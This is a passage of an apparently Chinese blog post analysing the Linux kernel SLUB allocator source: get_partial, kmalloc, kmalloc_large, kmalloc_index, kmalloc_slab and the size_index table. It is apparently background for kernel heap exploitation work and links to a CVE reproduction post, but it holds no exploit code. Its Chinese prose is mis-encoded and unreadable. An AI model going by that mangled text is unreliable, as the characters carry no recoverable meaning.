‡ç­¾å†…ã€‚è¿™é‡Œé¦–å…ˆä¼šåˆ†é…ä¸€ä¸ªæ–°çš„slabå¹¶è®¾ç½®<code>partial_context</code>ï¼Œè°ƒç”¨<code>get_partial</code>å°è¯•ä»å½“å‰nodeçš„<code>kmem_cache_node</code>çš„<code>partial</code>é“¾è¡¨ä¸­åˆ†é…ä¸€ä¸ªslabï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è·³è½¬åˆ°<code>check_new_slab</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">get_partial</span><span class="params">(struct kmem_cache *s, <span class="keyword">int</span> node, struct partial_context *pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"><span class="keyword">int</span> searchnode = node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">searchnode = numa_mem_id();</span><br><span class="line"></span><br><span class="line">object = get_partial_node(s, get_node(s, searchnode), pc);</span><br><span class="line"><span class="keyword">if</span> (object || node != NUMA_NO_NODE)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_any_partial(s, pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœnodeçš„ä¸º<code>NUMA_NO_NODE</code>åˆ™ä¼šè°ƒç”¨<code>get_any_partial</code>å°è¯•ä»å…¶ä»–çš„nodeçš„<code>kmem_cache_node</code>ä¸­åˆ†é…ã€‚å¦‚æœ<code>get_partial</code>å‡½æ•°æ²¡èƒ½ä»nodeçš„<code>kmem_cache_node</code>ä¸­è·å¾—slabçš„è¯åˆ™ä¼šè°ƒç”¨<code>new_slab</code>å‘<code>buddy system</code>ç”³è¯·ä¸€ä»½æ–°çš„slabã€‚</p><p>åœ¨æ‹¿åˆ°<code>slab</code>ä¹‹åç»§ç»­å¾€åé¢èµ°ä¼šå…ˆåˆ¤æ–­æ˜¯å¦æœ‰<code>SLAB_DEBUG_FLAGS</code>æ ‡è¯†ä½ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨<code>alloc_single_from_new_slab</code>å‡½æ•°ï¼Œä»æ–°åˆ†é…çš„<code>slab</code>ä¸­è·å–ä¸€ä¸ªå¯¹è±¡ä¹‹åæ”¾å›<code>partial</code>/<code>full</code>ä¸­ï¼Œå¦‚æœå¤±è´¥åˆ™é€€å‡ºï¼ŒæˆåŠŸè¿”å›ã€‚è‹¥æ˜¯æ²¡æœ‰è®¾ç½®<code>SLAB_DEBUG_FLAGS</code>è¿™ä¸ªæ ‡è¯†ä½ï¼Œé‚£å°±è·å–slabçš„<code>freelist</code>éšåè°ƒç”¨<code>inc_slabs_node</code>å‡½æ•°ç»™nodeçš„å¼•ç”¨è®¡æ•°å¢åŠ ã€‚</p><p>æ¥ä¸‹æ¥çœ‹<code>check_new_slab</code>æ ‡ç­¾ï¼Œè¿™é‡Œé¢åšçš„äº‹æ¯”è¾ƒå°‘ï¼Œé¦–å…ˆåˆ™æ˜¯æ£€æŸ¥è¯¥<code>kmem_cache</code>æ˜¯å¦è®¾ç½®äº†<code>SLAB_DEBUG_FLAGS</code>æ ‡è¯†ä½ï¼Œç„¶åæ£€æŸ¥æ˜¯å¦è®¾ç½®äº†<code>SLAB_STORE_USER</code>æ ‡è¯†ä½ï¼Œéšåè¿”å›<code>freelist</code>ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®åˆ™è°ƒç”¨<code>pfmemalloc_match</code>æ£€æŸ¥slabä¸åˆ†é…æ ‡è¯†ä½æ˜¯å¦ä¸åŒ¹é…ï¼Œå¦‚æœä¸åŒ¹é…åˆ™è°ƒç”¨<code>deactivate_slab</code>ç¦ç”¨slabå¹¶è¿”å›<code>freelist</code>ã€‚</p><p>æœ€åå°±æ˜¯<code>retry_load_slab</code>æ ‡ç­¾ï¼Œè¿™é‡Œå°±æ˜¯å°è¯•åŠ è½½æ–°è·å¾—çš„slabï¼Œå¦‚æœ<code>percpu slab</code>ä¸ä¸ºNULLï¼Œé‚£ä¹ˆè¿™é‡Œå°±å°†å…¶å’Œ<code>freelist</code>è®¾ç½®ä¸ºNULLï¼Œéšåè°ƒç”¨<code>deactivate_slab</code>ç¦ç”¨slabå¹¶è·å–ä¸‹ä¸€ä¸ªtidï¼Œæœ€åå°†æ–°è·å¾—çš„slabè®¾ç½®åˆ°<code>percpu slab</code>éšåè·³è½¬åˆ°<code>load_freelist</code>åˆ†é…å¯¹è±¡å¹¶è¿”å›ã€‚</p><h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h3><p>å‰é¢ä¸»è¦æ˜¯slubç®—æ³•çš„æ ¸å¿ƒé€»è¾‘ï¼Œä¸‹é¢æ¥å¯¹è±¡åˆ†é…æ›´ä¸Šçº§çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline __alloc_size(<span class="number">1</span>) <span class="function"><span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"><span class="keyword">return</span> kmalloc_trace(</span><br><span class="line">kmalloc_caches[kmalloc_type(flags, _RET_IP_)][index],</span><br><span class="line">flags, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„é€»è¾‘å¾ˆç®€å•ï¼Œé¦–å…ˆçœ‹sizeä¸ºç¼–è¯‘é¢„çŸ¥çš„ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥è°ƒç”¨<code>__kmalloc</code>ã€‚å¦‚æœæ˜¯åˆ™è¿›å…¥å†…éƒ¨ï¼Œé¦–å…ˆä¼šåˆ¤æ–­sizeæ˜¯å¦å¤§äº<code>KMALLOC_MAX_CACHE_SIZE</code>å¦‚æœæ˜¯åˆ™ç›´æ¥è°ƒç”¨<code>kmalloc_large</code>è¿›è¡Œåˆ†é…å¹¶è¿”å›ï¼Œå¦‚æœä¸æ˜¯åˆ™è°ƒç”¨<code>kmalloc_index</code>å‡½æ•°è·å–åˆ°ç´¢å¼•éšåä½¿ç”¨<code>kmalloc_trace</code>å‡½æ•°è¿›è¡Œåˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__kmalloc_large_node(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = get_order(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))</span><br><span class="line">flags = kmalloc_fix_flags(flags);</span><br><span class="line"></span><br><span class="line">flags |= __GFP_COMP;</span><br><span class="line">page = alloc_pages_node(node, flags, order);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">ptr = page_address(page);</span><br><span class="line">mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,</span><br><span class="line">      PAGE_SIZE &lt;&lt; order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ptr = kasan_kmalloc_large(ptr, size, flags);</span><br><span class="line"><span class="comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span></span><br><span class="line">kmemleak_alloc(ptr, size, <span class="number">1</span>, flags);</span><br><span class="line">kmsan_kmalloc_large(ptr, size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc_large</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);</span><br><span class="line"></span><br><span class="line">trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),</span><br><span class="line">      flags, NUMA_NO_NODE);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_large);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>kmalloc_large</code>æœ€ç»ˆä¼šè°ƒç”¨çš„æ˜¯<code>__kmalloc_large_node</code>å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œå¯ä»¥çœ‹åˆ°å…¶ç›´æ¥è°ƒç”¨äº†<code>alloc_pages_node</code>å‘<code>buddy system</code>è¯·æ±‚å†…å­˜äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">unsigned</span> <span class="keyword">int</span> __kmalloc_index(<span class="keyword">size_t</span> size,</span><br><span class="line">    <span class="keyword">bool</span> size_is_constant)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line"><span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)</span><br><span class="line">BUILD_BUG_ON_MSG(<span class="number">1</span>, <span class="string">&quot;unexpected size in kmalloc_index()&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">BUG();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kmalloc_index(s) __kmalloc_index(s, true)</span></span><br></pre></td></tr></table></figure><p>è€Œ<code>kmalloc_index</code>å‡½æ•°å…¶å®å°±æ˜¯è°ƒç”¨<code>__kmalloc_index</code>ï¼Œå…¶å†…éƒ¨å®ç°ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•ç²—æš´ã€‚</p><p>å…³äº<code>kmalloc_type</code>å‡½æ•°åœ¨ <a class="link"   href="https://cv196082.gitee.io/2023/10/15/CVE-2022-0185/" >CVE-2022-0185å¤ç°<i class="fas fa-external-link-alt"></i></a> æ–‡ç« ä¸­è¯¦ç»†åˆ†æè¿‡äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmem_cache_alloc_node(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags,</span><br><span class="line">      <span class="keyword">int</span> node, <span class="keyword">size_t</span> orig_size,</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> slab_alloc_node(s, <span class="literal">NULL</span>, gfpflags, node,</span><br><span class="line">       caller, orig_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc_trace</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,</span><br><span class="line">    size, _RET_IP_);</span><br><span class="line"></span><br><span class="line">trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);</span><br><span class="line"></span><br><span class="line">ret = kasan_kmalloc(s, ret, size, gfpflags);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_trace);</span><br></pre></td></tr></table></figure><p><code>kmalloc_trace</code>å°±æ˜¯å¯¹<code>__kmem_cache_alloc_node</code>å‡½æ•°çš„è°ƒç”¨ï¼Œè€Œ<code>__kmem_cache_alloc_node</code>å…¶å®å°±æ˜¯å¯¹<code>slab_alloc_node</code>çš„wrapperï¼Œå‰é¢ä¹Ÿå·²ç»åˆ†æè¿‡<code>slab_alloc_node</code>äº†ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡ŒæŒ‡å®šäº†nodeä¸º<code>NUMA_NO_NODE</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>__kmalloc</code>ä¹Ÿæ˜¯ç›´æ¥è°ƒç”¨äº†<code>__do_kmalloc_node</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline</span><br><span class="line"><span class="keyword">void</span> *__do_kmalloc_node(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;</span><br><span class="line">ret = __kmalloc_large_node(size, flags, node);</span><br><span class="line">trace_kmalloc(caller, ret, size,</span><br><span class="line">      PAGE_SIZE &lt;&lt; get_order(size), flags, node);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = kmalloc_slab(size, flags, caller);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">ret = __kmem_cache_alloc_node(s, flags, node, size, caller);</span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line">trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„é€»è¾‘åœ¨å¼€å¤´ä½ç½®åŒä¸Šï¼Œå¦‚æœsizeå¤§äº<code>KMALLOC_MAX_CACHE_SIZE</code>é‚£ä¹ˆå°±ç›´æ¥è°ƒç”¨<code>__kmalloc_large_node</code>è¿›è¡Œåˆ†é…ã€‚å¦‚æœå°äºçš„è¯åˆ™è´¤è°ƒç”¨<code>kmalloc_slab</code>å¯»æ‰¾åˆ°å¯¹åº”çš„<code>kmem_cache</code>ç„¶åè°ƒç”¨<code>__kmem_cache_alloc_node</code>è¿›è¡Œåˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags, <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">index = size_index[size_index_elem(size)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">index = fls(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags, caller)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯»æ‰¾çš„æ–¹å¼ä¹Ÿå’Œå‰é¢çš„ååˆ†ç›¸ä¼¼ï¼Œ<code>size_index</code>å’Œ<code>size_index_elem</code>çš„å®ç°ä¹Ÿæ˜¯æ¯”è¾ƒç²—æš´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> u8 size_index[<span class="number">24</span>] __ro_after_init = &#123;</span><br><span class="line"><span class="number">3</span>,<span class="comment">/* 8 */</span></span><br><span class="line"><span class="number">4</span>,<span class="comment">/* 16 */</span></span><br><span class="line"><span class="number">5</span>,<span class="comment">/* 24 */</span></span><br><span class="line"><span class="number">5</span>,<span class="comment">/* 32 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 40 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 48 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 56 */</span></span><br><span class="line"><span class="number">6</span>,<span class="comment">/* 64 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 72 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 80 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 88 */</span></span><br><span class="line"><span class="number">1</span>,<span class="comment">/* 96 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 104 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 112 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 120 */</span></span><br><span class="line"><span class="number">7</span>,<span class="comment">/* 128 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 136 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 144 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 152 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 160 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 168 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 176 */</span></span><br><span class="line"><span class="number">2</span>,<span class="comment">/* 184 */</span></span><br><span class="line"><span class="number">2</span><span class="comment">/* 192 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">size_index_elem</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (bytes - <span class="number">1</span>) / <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¯¹è±¡çš„é‡Šæ”¾"><a href="#å¯¹è±¡çš„é‡Šæ”¾" class="headerlink" title="å¯¹è±¡çš„é‡Šæ”¾"></a>å¯¹è±¡çš„é‡Šæ”¾</h2><h3 id="do-slab-free"><a href="#do-slab-free" class="headerlink" title="do_slab_free"></a>do_slab_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">do_slab_free</span><span 